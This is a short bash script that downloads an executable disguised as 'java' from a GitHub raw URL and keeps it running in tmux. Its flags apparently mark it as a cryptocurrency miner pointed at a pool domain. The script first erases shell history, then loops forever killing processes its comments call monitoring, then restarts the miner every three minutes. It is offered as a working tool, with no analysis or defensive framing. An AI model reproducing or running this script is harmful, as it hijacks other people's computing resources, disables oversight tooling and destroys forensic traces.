#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 🔁 Kill các tiến trình giám sát
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/java/java" ]; then
    echo "[+] Downloading ..."
    rm -rf java java.tar.gz
    curl -sL -o java.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
    tar -xzf java.tar.gz
    chmod +x java/java
    rm -f java.tar.gz
fi

# 🔁 Kiểm tra và chạy lại nếu session không tồn tại
echo "[+] Vòng lặp kiểm tra session mỗi 3 phút ..."
while true; do
    if ! tmux has-session -t $SESSION 2>/dev/null; then
        echo "[+] Session không tồn tại -> khởi chạy lại..."
        tmux new-session -s $SESSION -d
        tmux send-keys -t $SESSION "
            $(pwd)/java/java -o $DOMAIN --tls -k -t 7 --rig-id $NAME_WORK
        " C-m
    else
        echo "[+] Session vẫn đang chạy..."
    fi
    sleep 180   # 3 phút check 1 lần
done
